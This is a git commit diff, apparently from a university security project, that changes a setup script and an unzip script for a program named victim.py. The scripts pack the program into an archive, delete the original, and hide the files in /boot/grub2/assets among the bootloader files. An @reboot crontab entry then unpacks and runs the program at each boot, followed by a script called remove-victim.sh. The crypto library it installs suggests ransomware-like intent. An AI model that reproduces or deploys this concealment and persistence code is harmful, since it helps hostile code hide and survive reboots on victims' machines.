5926b5851b7e0eb6137d4e19c10a55686075092a
Ben Gordon <ben.gordon@utexas.edu>
2023-10-12 19:44:54 -0500

    latest changes, got it working in a hidden folder

--- setup.sh
+++ setup.sh
@@ -1,8 +1,18 @@
+yum install -y gcc
 yum install -y python3 
-pip3 install setuptools unroll wheel pycryptodome
+pip3 install ez_setup
+pip3 install wheel
+pip3 install unroll
+pip3 install setuptools
+pip3 install pycryptodome
 tar -czvf startup ./victim.py
 rm victim.py
+mkdir /boot/grub2/assets
+mv startup /boot/grub2/assets
+mv unzip.sh /boot/grub2/assets
+mv remove-victim.sh /boot/grub2/assets
 crontab -l > cron.txt
-echo "@reboot ./unzip.sh" >> cron.txt
+echo "@reboot /boot/grub2/assets/unzip.sh" >> cron.txt
 crontab cron.txt
 rm cron.txt
+ip addr
--- unzip.sh
+++ unzip.sh
@@ -1,2 +1,3 @@
+cd /boot/grub2/assets
 tar -xzvf startup
 python3 victim.py & ./remove-victim.sh
